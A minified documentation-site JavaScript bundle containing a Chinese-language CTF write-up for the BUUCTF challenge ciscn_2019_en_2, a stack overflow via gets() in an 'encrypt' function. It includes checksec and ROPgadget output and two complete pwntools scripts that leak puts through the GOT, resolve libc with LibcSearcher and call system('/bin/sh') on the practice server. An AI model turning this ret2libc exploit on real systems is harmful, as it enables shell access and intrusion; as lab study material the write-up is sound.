(self.webpackChunkdocs=self.webpackChunkdocs||[]).push([[799],{3905:function(n,e,t){"use strict";t.d(e,{Zo:function(){return l},kt:function(){return d}});var r=t(7294);function p(n,e,t){return e in n?Object.defineProperty(n,e,{value:t,enumerable:!0,configurable:!0,writable:!0}):n[e]=t,n}function a(n,e){var t=Object.keys(n);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(n);e&&(r=r.filter((function(e){return Object.getOwnPropertyDescriptor(n,e).enumerable}))),t.push.apply(t,r)}return t}function i(n){for(var e=1;e<arguments.length;e++){var t=null!=arguments[e]?arguments[e]:{};e%2?a(Object(t),!0).forEach((function(e){p(n,e,t[e])})):Object.getOwnPropertyDescriptors?Object.defineProperties(n,Object.getOwnPropertyDescriptors(t)):a(Object(t)).forEach((function(e){Object.defineProperty(n,e,Object.getOwnPropertyDescriptor(t,e))}))}return n}function o(n,e){if(null==n)return{};var t,r,p=function(n,e){if(null==n)return{};var t,r,p={},a=Object.keys(n);for(r=0;r<a.length;r++)t=a[r],e.indexOf(t)>=0||(p[t]=n[t]);return p}(n,e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(n);for(r=0;r<a.length;r++)t=a[r],e.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(n,t)&&(p[t]=n[t])}return p}var c=r.createContext({}),s=function(n){var e=r.useContext(c),t=e;return n&&(t="function"==typeof n?n(e):i(i({},e),n)),t},l=function(n){var e=s(n.components);return r.createElement(c.Provider,{value:e},n.children)},u={inlineCode:"code",wrapper:function(n){var e=n.children;return r.createElement(r.Fragment,{},e)}},_=r.forwardRef((function(n,e){var t=n.components,p=n.mdxType,a=n.originalType,c=n.parentName,l=o(n,["components","mdxType","originalType","parentName"]),_=s(t),d=p,m=_["".concat(c,".").concat(d)]||_[d]||u[d]||a;return t?r.createElement(m,i(i({ref:e},l),{},{components:t})):r.createElement(m,i({ref:e},l))}));function d(n,e){var t=arguments,p=e&&e.mdxType;if("string"==typeof n||p){var a=t.length,i=new Array(a);i[0]=_;var o={};for(var c in e)hasOwnProperty.call(e,c)&&(o[c]=e[c]);o.originalType=n,o.mdxType="string"==typeof n?n:p,i[1]=o;for(var s=2;s<a;s++)i[s]=t[s];return r.createElement.apply(null,i)}return r.createElement.apply(null,t)}_.displayName="MDXCreateElement"},6928:function(n,e,t){"use strict";t.r(e),t.d(e,{frontMatter:function(){return o},contentTitle:function(){return c},metadata:function(){return s},toc:function(){return l},default:function(){return _}});var r=t(2122),p=t(9756),a=(t(7294),t(3905)),i=["components"],o={title:"ciscn_2019_en_2",sidebar_position:11},c=void 0,s={unversionedId:"BUUCTF/\u6808\u6ea2\u51fa/ciscn_2019_en_2",id:"BUUCTF/\u6808\u6ea2\u51fa/ciscn_2019_en_2",isDocsHomePage:!1,title:"ciscn_2019_en_2",description:"\u7531\u4e8e\u672c\u9898\u4e0eciscn_2019_c_1\u4e00\u6a21\u4e00\u6837\uff0c\u56e0\u6b64\u4e00\u4e0b\u5185\u5bb9\u4e5f\u4e0eciscn_2019_c_1\u76f8\u540c",source:"@site/docs\\BUUCTF\\\u6808\u6ea2\u51fa\\ciscn_2019_en_2.md",sourceDirName:"BUUCTF/\u6808\u6ea2\u51fa",slug:"/BUUCTF/\u6808\u6ea2\u51fa/ciscn_2019_en_2",permalink:"/BUUCTF/\u6808\u6ea2\u51fa/ciscn_2019_en_2",version:"current",sidebarPosition:11,frontMatter:{title:"ciscn_2019_en_2",sidebar_position:11},sidebar:"tutorialSidebar",previous:{title:"jarvisoj_level2",permalink:"/BUUCTF/\u6808\u6ea2\u51fa/jarvisoj_level2"},next:{title:"bjdctf_2020_babystack",permalink:"/BUUCTF/\u6808\u6ea2\u51fa/bjdctf_2020_babystack"}},l=[],u={toc:l};function _(n){var e=n.components,t=(0,p.Z)(n,i);return(0,a.kt)("wrapper",(0,r.Z)({},u,t,{components:e,mdxType:"MDXLayout"}),(0,a.kt)("p",null,(0,a.kt)("strong",{parentName:"p"},"\u7531\u4e8e\u672c\u9898\u4e0eciscn_2019_c_1\u4e00\u6a21\u4e00\u6837\uff0c\u56e0\u6b64\u4e00\u4e0b\u5185\u5bb9\u4e5f\u4e0eciscn_2019_c_1\u76f8\u540c")),(0,a.kt)("p",null,"checksec\u7ed3\u679c\uff1a"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-bash"},"RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE\nPartial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   85) Symbols       No    0               1               ciscn_2019_c_1\n")),(0,a.kt)("p",null,"\u62d6\u5165ida64\u5206\u6790\uff0c",(0,a.kt)("inlineCode",{parentName:"p"},"main"),"\u51fd\u6570\u6ca1\u6709\u4ec0\u4e48\u4ef7\u503c\uff0c\u5c31\u662f\u5224\u65ad\u8f93\u5165\u5185\u5bb9\uff0c1\u5c31\u8c03\u7528",(0,a.kt)("inlineCode",{parentName:"p"},"encrypt"),"\u51fd\u6570\uff1b2\u5c31\u8ba9\u4f60\u81ea\u5df1\u89e3\u5bc6\uff0c\u4ed6\u4e0d\u7ba1\uff1b3\u5c31\u7ed3\u675f\u3002"),(0,a.kt)("p",null,"\u552f\u4e00\u53ef\u4ee5\u770b\u7684\u5c31\u4e00\u4e2a\u52a0\u5bc6\u51fd\u6570\uff0c\u4ee3\u7801\u5982\u4e0b\uff1a"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-c"},'int encrypt()\n{\n  size_t v0; // rbx\n  char s[48]; // [rsp+0h] [rbp-50h] BYREF\n  __int16 v3; // [rsp+30h] [rbp-20h]\n\n  memset(s, 0, sizeof(s));\n  v3 = 0;\n  puts("Input your Plaintext to be encrypted");\n  gets(s);\n  while ( 1 )\n  {\n    v0 = (unsigned int)x;\n    if ( v0 >= strlen(s) )\n      break;\n    if ( s[x] <= 96 || s[x] > 122 )\n    {\n      if ( s[x] <= 64 || s[x] > 90 )\n      {\n        if ( s[x] > 47 && s[x] <= 57 )\n          s[x] ^= 0xFu;\n      }\n      else\n      {\n        s[x] ^= 0xEu;\n      }\n    }\n    else\n    {\n      s[x] ^= 0xDu;\n    }\n    ++x;\n  }\n  puts("Ciphertext");\n  return puts(s);\n}\n')),(0,a.kt)("p",null,"\u521a\u8fdb\u51fd\u6570\uff0c\u5c31\u6709\u4e00\u4e2agets\u5165\u773c\uff0c\u90a3\u4e48\u641c\u7d22\u4e00\u4e0b\u5371\u9669\u51fd\u6570\uff0c\u7136\u800c\u5e76\u6ca1\u6709\u4efb\u4f55\u53d1\u73b0\u3002\u90a3\u8fd9\u9898\u5c31\u53ea\u80fd\u81ea\u5df1\u6784\u9020ROP\u53bb\u8c03\u7528system('/bin/sh')\u4e86\uff0c\u8fd9\u91cc\u5229\u7528puts\u51fd\u6570\u6765\u8ba1\u7b97\u5730\u5740\u3002"),(0,a.kt)("p",null,"\u9996\u5148\u7528ROPgadget\u641c\u4e00\u4e0bpop rdi ; ret\u548cret"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-bash"},'\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop]\n\u2514\u2500$ ROPgadget --binary ./ciscn_2019_c_1 --only "pop|ret"\nGadgets information\n============================================================\n0x0000000000400c7c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n0x0000000000400c7e : pop r13 ; pop r14 ; pop r15 ; ret\n0x0000000000400c80 : pop r14 ; pop r15 ; ret\n0x0000000000400c82 : pop r15 ; ret\n0x0000000000400c7b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n0x0000000000400c7f : pop rbp ; pop r14 ; pop r15 ; ret\n0x00000000004007f0 : pop rbp ; ret\n0x0000000000400aec : pop rbx ; pop rbp ; ret\n0x0000000000400c83 : pop rdi ; ret\n0x0000000000400c81 : pop rsi ; pop r15 ; ret\n0x0000000000400c7d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret\n0x00000000004006b9 : ret\n0x00000000004008ca : ret 0x2017\n0x0000000000400962 : ret 0x458b\n0x00000000004009c5 : ret 0xbf02\n\nUnique gadgets found: 15\n                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop]\n\u2514\u2500$ ROPgadget --binary ./ciscn_2019_c_1 --only "ret"\nGadgets information\n============================================================\n0x00000000004006b9 : ret\n0x00000000004008ca : ret 0x2017\n0x0000000000400962 : ret 0x458b\n0x00000000004009c5 : ret 0xbf02\n\nUnique gadgets found: 4\n')),(0,a.kt)("p",null,"\u627e\u5230pop rdi ; ret\u5730\u5740",(0,a.kt)("inlineCode",{parentName:"p"},"0x400c83"),"\uff0cret\u5730\u5740",(0,a.kt)("inlineCode",{parentName:"p"},"0x4006b9"),"\u3002"),(0,a.kt)("p",null,"\u9996\u5148\u9700\u8981\u6cc4\u9732\u51faputs\u51fd\u6570\u7684\u5730\u5740\uff0c\u8fd9\u6837\u624d\u80fd\u7b97\u51fasystem\u51fd\u6570\u548c\u5b57\u7b26\u4e32/bin/sh\u7684\u5730\u5740\u3002\u4e3a\u4e86\u8282\u7701\u65f6\u95f4\uff0c\u7b2c\u4e00\u4e2a\u5b57\u7b26\u7528",(0,a.kt)("inlineCode",{parentName:"p"},"\\x00"),"\u6765\u7ed5\u8fc7strlen\u4ee5\u6b64\u6765\u8df3\u8fc7\u5faa\u73af\u52a0\u5bc6\u3002\u56e0\u4e3a\u540e\u9762\u8fd8\u9700\u8981\u8c03\u7528",(0,a.kt)("inlineCode",{parentName:"p"},"system('/bin/sh')"),"\uff0c\u56e0\u6b64\u8fd8\u9700\u8981\u518d\u6267\u884c\u4e00\u6b21main\u51fd\u6570\u3002"),(0,a.kt)("p",null,"\u6839\u636e\u4ee5\u4e0a\u6761\u4ef6\u6784\u9020\u51fa\u7b2c\u4e00\u4e2apayload\uff1a",(0,a.kt)("inlineCode",{parentName:"p"},"payload1 = b'\\x00' + b'a' * 0x57 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(_start_addr)")),(0,a.kt)("p",null,"\u5148\u7528\u8fd9\u90e8\u5206\u770b\u770b\u8f93\u51fa\u60c5\u51b5\uff0c\u5199\u51fa\u5982\u4e0b\u811a\u672c\uff1a"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-python"},"from pwn import *\n\nis_debug = 1\nfile_name = './ciscn_2019_c_1'\nhost = 'node3.buuoj.cn'\nport = 25980\n\ndef main():\n    if is_debug:\n        sh = process(file_name)\n    else:\n        sh = remote(host, port)\n        \n    elf = ELF(file_name)\n    pop_rdi_ret = 0x400c83\n    ret = 0x4006b9\n    puts_plt = elf.plt['puts']\n    puts_got = elf.got['puts']\n    _start_addr = elf.symbols['_start']\n    \n    payload1 = b'\\x00' + b'a' * 0x57 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(_start_addr)\n    sh.sendlineafter('Input your choice!\\n', '1')\n    sh.sendlineafter('Input your Plaintext to be encrypted\\n', payload1)\n    sh.interactive()\n\nif __name__ == '__main__':\n    main()\n")),(0,a.kt)("p",null,"\u8fd0\u884c\u7ed3\u679c\u5982\u4e0b\uff1a"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-bash"},"\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop]\n\u2514\u2500$ python3 exp.py                                                                                                                             1 \u2a2f\n[+] Starting local process './ciscn_2019_c_1': pid 3461\n[*] '/home/kali/Desktop/ciscn_2019_c_1'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)\n4196064\n[*] Switching to interactive mode\nCiphertext\n\n\\xf0\\x85j\\xe0\\x7f\nEEEEEEE                            hh      iii                \nEE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  \nEEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e \nEE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  \nEEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee \n====================================================================\nWelcome to this Encryption machine\n\n====================================================================\n1.Encrypt\n2.Decrypt\n3.Exit\nInput your choice!\n$\n")),(0,a.kt)("p",null,"\u4ece\u4e0a\u9762\u53ef\u4ee5\u770b\u5230puts\u51fd\u6570\u7684\u5730\u5740\u88ab\u6cc4\u9732\u51fa\u6765\u4e86\uff0c\u63a5\u4e0b\u6765\u5c31\u662f\u7528LibcSearcher\u6765\u641c\u7d22puts\u7684\u5728libc\u4e2d\u7684\u5730\u5740\uff0c\u7136\u540e\u8ba1\u7b97\u504f\u79fb\u91cf\uff0c\u518d\u7528system\u548c/bin/sh\u5728libc\u4e2d\u7684\u5730\u5740\u52a0\u4e0a\u504f\u79fb\u91cf\u5f97\u5230\u771f\u5b9e\u5730\u5740\u3002\u7136\u540e\u518d\u6ea2\u51fa\u8c03\u7528system('/bin/sh')\u3002"),(0,a.kt)("p",null,"\u6700\u7ec8\u811a\u672c\u5982\u4e0b\uff1a"),(0,a.kt)("blockquote",null,(0,a.kt)("p",{parentName:"blockquote"},"ps: \u8fd9\u8fb9\u4e0d\u77e5\u9053\u4e3a\u4ec0\u4e48\uff0c\u6211\u672c\u5730libc\u75282.31\u7684EOF\uff0c\u7136\u540e\u6211\u6307\u5b9a\u75282.27\u76f4\u63a5EOF\uff0c\u8f93\u5165\u90fd\u4e0d\u7ed9\u8f93\u5165\u3002\u3002\u4f46\u662fbuu\u7684\u670d\u52a1\u5668\u4e0a\u9762\u4e0a\u53bb\u8ba9\u6211\u9009\u53c8\u5f97\u9009\u90a3\u4e2a2.27\u7684\u624d\u80fd\u6b63\u5e38\u901a\u8fc7\u2026\u2026\u8ff7\u60d1\u3002")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-python"},"from pwn import *\nfrom LibcSearcher import *\n\nis_debug = 1\nfile_name = './ciscn_2019_c_1'\nhost = 'node3.buuoj.cn'\nport = 28565\n\ndef main():\n    if is_debug:\n        sh = process(file_name)\n    else:\n        sh = remote(host, port)\n        \n    elf = ELF(file_name)\n    pop_rdi_ret = 0x400c83\n    ret = 0x4006b9\n    puts_plt = elf.plt['puts']\n    puts_got = elf.got['puts']\n    _start_addr = elf.symbols['_start']\n\n    payload1 = b'\\x00' + b'a' * 0x57 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(_start_addr)\n    sh.sendlineafter('Input your choice!\\n', '1')\n    sh.sendlineafter('Input your Plaintext to be encrypted\\n', payload1)\n    \n    sh.recvuntil('Ciphertext\\n')\n    sh.recvline()\n    puts_addr = u64(sh.recvline()[:-1].ljust(8, b'\\x00'))\n    \n    libc = LibcSearcher('puts', puts_addr)\n    libc_base = puts_addr - libc.dump('puts')\n    sys_addr = libc_base + libc.dump('system')\n    bin_sh_addr = libc_base + libc.dump('str_bin_sh')\n    \n    payload2 = b'\\x00' + b'a' * 0x57 + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(sys_addr)\n    sh.sendlineafter('Input your choice!\\n', '1')\n    sh.sendlineafter('Input your Plaintext to be encrypted\\n', payload2)\n    \n    sh.interactive()\n\nif __name__ == '__main__':\n    main()\n")),(0,a.kt)("p",null,"{% endhideToggle %}"))}_.isMDXComponent=!0}}]);